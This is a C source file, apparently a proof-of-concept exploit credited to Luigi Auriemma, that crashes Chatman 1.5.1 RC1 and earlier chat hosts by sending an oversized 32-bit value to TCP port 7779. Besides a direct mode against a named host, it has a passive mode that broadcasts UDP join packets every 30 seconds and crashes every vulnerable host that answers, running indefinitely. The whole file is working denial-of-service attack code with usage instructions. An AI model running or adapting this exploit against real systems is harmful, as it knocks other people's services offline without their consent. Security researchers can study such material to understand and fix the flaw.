/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
    #define TWAIT   30000
    DWORD   tid1;
    HANDLE  thandle;
    #define launch_thread(FUNCTION, PARAMETER) \
        thandle = CreateThread(NULL, 0, (void *)&FUNCTION, (void *)PARAMETER, 0, &tid1); \
        if(!thandle)
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
    #include <pthread.h>

    #define ONESEC  1
    #define TWAIT   30
    pthread_t   tid1;
    int         thandle;
    #define launch_thread(FUNCTION, PARAMETER) \
        thandle = pthread_create(&tid1, NULL, (void *)&FUNCTION, (void *)PARAMETER); \
        if(thandle)
#endif



#define VER     "0.1"
#define PORT    7779
#define JOIN    "/TS\r" "crash"
#define BOOM    "\x00\x00\x00\x7f"
    // the cause of the bug is a too big 32 bit value
    // so the allocation fails and the host exits
    // note, are made some operations on this number
    // by the target host


#ifdef WIN32
    DWORD WINAPI broadjoin(void);
    DWORD WINAPI client(int sock);
#else
    void *broadjoin(void);
    void *client(int sock);
#endif
u_long resolv(char *host);
void std_err(void);



u_long  broadip = 0xffffffffL;



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd,
            sa,
            type,
            on = 1,
            psz;


    setbuf(stdout, NULL);

    fputs("\n"
        "Chatman <= 1.5.1 RC1 broadcast crash "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <d/p> [host]\n"
            "\n"
            "d = direct, you must specify the host to crash\n"
            "    Example: %s d localhost\n"
            "p = passive broadcast crash, any Chatman host reacheable by 255.255.255.255\n"
            "    (or any other address choosen by you) will be passively crashed.\n"
            "    Examples: %s p\n"
            "              %s p 227.0.0.2\n"
            "              %s p 127.0.0.1\n"
            "\n", argv[0], argv[0], argv[0], argv[0], argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    type = argv[1][0];
    if((type != 'd') && (type != 'p')) {
        fputs("\nError: You must choose between 'd' or 'p'\n", stdout);
        exit(1);
    }

    if(type == 'd') {
        if(argc < 3) {
            fputs("\nError: you must specify the host to crash\n", stdout);
            exit(1);
        }
        peer.sin_addr.s_addr = resolv(argv[2]);
        printf("- target   %s:%hu\n",
            inet_ntoa(peer.sin_addr),
            PORT);
    } else {
        if(argc > 2) broadip = resolv(argv[2]);
        peer.sin_addr.s_addr = INADDR_ANY;
        psz                  = sizeof(peer);
        printf("- target   %s (UDP %d, bind %d)\n",
            inet_ntoa(*(struct in_addr *)&broadip),
            PORT - 1,
            PORT);
    }
    peer.sin_port   = htons(PORT);
    peer.sin_family = AF_INET;

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    if(type == 'd') {
        if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();

        fputs("- send BOOM data\n", stdout);
        if(send(sd, BOOM, sizeof(BOOM) - 1, 0)
          < 0) std_err();
        fputs("- the host should be crashed, check it manually\n", stdout);

    } else {
        fputs(
            "- launch the broad ping, the tool will automatically and passively crash any\n"
            "  vulnerable Chatman host each 30 seconds (so it runs infinitely until you\n"
            "  stop it).\n", stdout);

        launch_thread(broadjoin, NULL) {
            fputs("\nError: Cannot create the thread\n", stdout);
            exit(1);
        }

        fputs("- bind TCP port to accept connections to crash hosts\n", stdout);
    	if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
    	  < 0) std_err();
        if(bind(sd, (struct sockaddr *)&peer, sizeof(peer))
    	  < 0) std_err();
        if(listen(sd, 5)
          < 0) std_err();

        for(;;) {
            sa = accept(sd, (struct sockaddr *)&peer, &psz);
            if(sa < 0) std_err();

            printf("Host %s:%hu -> BOOM\n",
                inet_ntoa(peer.sin_addr),
                ntohs(peer.sin_port));

            launch_thread(client, sa) {
                fputs("\nError: Cannot create the thread\n", stdout);
                exit(1);
            }
        }
    }

    close(sd);
    return(0);
}



#ifdef WIN32
    DWORD WINAPI broadjoin(void) {
#else
    void *broadjoin(void) {
#endif
    int                 sd,
                        on = 1;
    struct  sockaddr_in peer;

    peer.sin_addr.s_addr = broadip;
    peer.sin_port        = htons(PORT - 1); // 7778
    peer.sin_family      = AF_INET;

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    if(setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *)&on, sizeof(on))
      < 0) std_err();

    fputs("- send broadcast UDP join packet (each 30 seconds)\n", stdout);

    for(;;) {
        if(sendto(sd, JOIN, sizeof(JOIN) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
          < 0) std_err();
        fputs(".\n", stdout);
        sleep(TWAIT);
    }

    close(sd);
    return(0);
}



#ifdef WIN32
    DWORD WINAPI client(int sock) {
#else
    void *client(int sock) {
#endif
    if(send(sock, BOOM, sizeof(BOOM) - 1, 0)
      < 0) std_err();
    sleep(ONESEC);  // needed!
    close(sock);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


